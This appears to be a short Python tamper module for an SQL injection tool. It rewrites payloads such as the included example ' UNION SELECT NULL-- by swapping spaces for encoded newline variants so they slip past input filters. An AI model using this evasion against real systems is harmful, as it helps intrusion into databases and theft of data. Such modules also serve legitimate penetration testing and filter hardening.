import random

__example_payload__ = "' UNION SELECT NULL--"
__type__ = "replace spaces with newline split variants (%0a / %0A / LF / %0d%0a)"
__category__ = "encoding"
__chain_stage__ = "lexical"
__contexts__ = ("query", "form")

NEWLINE_VARIANTS = ("%0a", "%0A", "\n", "%0d%0a")


def tamper(payload, **kwargs):
    if not payload:
        return payload
    return str(payload).replace(" ", random.choice(NEWLINE_VARIANTS))
